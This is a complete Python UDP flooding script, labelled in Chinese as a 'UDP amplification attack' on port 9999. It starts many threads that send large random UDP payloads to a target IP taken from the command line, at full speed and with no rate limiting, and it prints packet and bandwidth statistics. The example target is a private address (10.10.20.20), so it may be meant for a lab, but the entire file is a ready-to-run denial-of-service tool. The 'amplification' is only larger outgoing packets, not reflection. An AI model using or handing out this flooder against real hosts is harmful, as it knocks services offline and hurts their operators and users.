#!/usr/bin/env python3
"""
UDP放大攻击 - 针对9999端口
模拟放大攻击效果，可以用nc命令测试
"""

import socket
import threading
import time
import random
import sys

class UDPAmplificationAttack:
    """UDP放大攻击类"""
    
    def __init__(self, target_ip, target_port=9999, num_threads=50, 
                 duration=60, amplification_factor=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.duration = duration
        self.amplification_factor = amplification_factor
        self.stop_event = threading.Event()
        self.total_packets = 0
        self.total_bytes = 0
        self.lock = threading.Lock()
    
    def _generate_amplified_payload(self):
        """生成放大的payload"""
        # 小请求触发大响应的模拟
        base_size = random.randint(64, 128)
        amplified_size = base_size * self.amplification_factor
        
        # 生成随机数据
        payload = bytes(random.getrandbits(8) for _ in range(amplified_size))
        return payload
    
    def _attack_thread(self, thread_id):
        """攻击线程"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        packet_count = 0
        bytes_sent = 0
        start_time = time.time()
        end_time = start_time + self.duration if self.duration > 0 else float('inf')
        
        print(f"线程 {thread_id} 开始攻击 {self.target_ip}:{self.target_port}")
        
        # 预生成一些payload，避免每次都生成
        payloads = [self._generate_amplified_payload() for _ in range(10)]
        
        try:
            while time.time() < end_time and not self.stop_event.is_set():
                try:
                    # 批量发送，提高效率
                    for _ in range(100):  # 每次循环发送100个包
                        payload = payloads[packet_count % 10]  # 轮流使用预生成的payload
                        sock.sendto(payload, (self.target_ip, self.target_port))
                        packet_count += 1
                        bytes_sent += len(payload)
                    
                    # 每10000个包打印一次统计
                    if packet_count % 10000 == 0:
                        elapsed = time.time() - start_time
                        pps = packet_count / elapsed if elapsed > 0 else 0
                        mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
                        print(f"线程 {thread_id}: {packet_count} 包, {pps:.0f} pps, {mbps:.1f} Mbps")
                    
                    # 不要sleep，全速发送！
                        
                except Exception as e:
                    continue
                    
        except KeyboardInterrupt:
            pass
        finally:
            sock.close()
            
        elapsed = time.time() - start_time
        pps = packet_count / elapsed if elapsed > 0 else 0
        mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
        print(f"线程 {thread_id} 完成: {packet_count:,} 包, {pps:.0f} pps, {mbps:.1f} Mbps")
        
        with self.lock:
            self.total_packets += packet_count
            self.total_bytes += bytes_sent
    
    def start(self):
        print("=" * 70)
        print("💥 UDP放大攻击 - 9999端口")
        print("=" * 70)
        print(f"目标: {self.target_ip}:{self.target_port}")
        print(f"线程数: {self.num_threads}")
        print(f"放大倍数: {self.amplification_factor}x")
        print(f"持续时间: {self.duration} 秒")
        print("=" * 70)
        print("\n测试命令: echo \"Hello Server\" | nc -u -v -w 1 10.10.20.20 9999\n")
        
        start_time = time.time()
        threads = []
        
        try:
            for i in range(self.num_threads):
                t = threading.Thread(target=self._attack_thread, args=(i + 1,))
                t.daemon = True
                t.start()
                threads.append(t)
                time.sleep(0.01)
            
            print(f"{self.num_threads} 个线程已启动!\n")
            
            for t in threads:
                t.join()
                
        except KeyboardInterrupt:
            print("\n\n🛑 停止攻击...")
            self.stop_event.set()
            for t in threads:
                t.join()
        
        elapsed = time.time() - start_time
        total_pps = self.total_packets / elapsed if elapsed > 0 else 0
        total_mbps = (self.total_bytes * 8 / 1000000) / elapsed if elapsed > 0 else 0
        
        print("\n" + "=" * 70)
        print("📊 攻击统计")
        print("=" * 70)
        print(f"总包数: {self.total_packets:,}")
        print(f"总字节数: {self.total_bytes:,}")
        print(f"持续时间: {elapsed:.1f} 秒")
        print(f"平均速率: {total_pps:,.0f} pps")
        print(f"平均带宽: {total_mbps:.1f} Mbps")
        print("=" * 70)

def main():
    if len(sys.argv) < 2:
        print("用法: python3 udp_amplification_9999.py <target_ip> [threads] [duration] [amplification]")
        print("\n示例:")
        print("  python3 udp_amplification_9999.py 10.10.20.20")
        print("  python3 udp_amplification_9999.py 10.10.20.20 50 60 100")
        print("\n参数说明:")
        print("  target_ip       目标IP地址")
        print("  threads         线程数 (默认: 50)")
        print("  duration        持续时间/秒 (默认: 60)")
        print("  amplification   放大倍数 (默认: 100)")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    num_threads = int(sys.argv[2]) if len(sys.argv) > 2 else 50
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    amplification = int(sys.argv[4]) if len(sys.argv) > 4 else 100
    
    attack = UDPAmplificationAttack(
        target_ip=target_ip,
        target_port=9999,
        num_threads=num_threads,
        duration=duration,
        amplification_factor=amplification
    )
    
    attack.start()

if __name__ == "__main__":
    main()
